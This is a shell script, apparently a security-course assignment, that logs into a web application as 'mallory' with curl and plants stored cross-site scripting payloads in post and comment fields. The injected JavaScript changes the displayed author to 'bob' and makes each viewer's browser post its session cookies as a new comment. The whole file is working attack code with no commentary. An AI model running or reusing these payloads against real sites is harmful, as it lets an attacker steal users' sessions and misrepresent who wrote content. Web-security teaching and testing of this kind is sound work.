mkdir ~/A2
URL=$1

curl -i -X POST -d 'username=mallory&password=MyPassword&form=login' -c  ~/A2/cookies.txt $1/post.php 

curl -i -X POST -d 'title=test+title&content=
<SCRIPT type="text/javascript"> function bobify() {if (document.location.pathname.endsWith("view.php")) {let arr = document.querySelectorAll("#author")[0].textContent.split(" ");arr[2] = "bob";document.querySelectorAll("#author")[0].textContent = arr.join(" ")}} </SCRIPT>
&type=1&form=content&submit=' -b  ~/A2/cookies.txt $1/post.php 


curl -i -X POST -d 'comment=<SCRIPT type="text/javascript">function getId() {if (document.location.pathname.endsWith("view.php")) {const param = new URLSearchParams(document.location.search);return param.get("id")}}</SCRIPT>
&form=comment&parent=15&uid=7&submit=' -b  ~/A2/cookies.txt $1/post.php 


curl -i -X POST -d 'comment=<SCRIPT type="text/javascript">function leaveComment(id) {if (document.location.pathname.endsWith("view.php")) {const xhr = new XMLHttpRequest();xhr.open("POST", "post.php", true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.send(`comment=${document.cookie}%26form=comment%26parent=${id}%26uid=7%26submit=`);}}</SCRIPT>
&form=comment&parent=15&uid=7&submit=' -b  ~/A2/cookies.txt $1/post.php 

curl -i -X POST -d 'comment=<SCRIPT type="text/javascript">bobify();leaveComment(getId());</SCRIPT>
&form=comment&parent=15&uid=7&submit=' -b  ~/A2/cookies.txt $1/post.php 

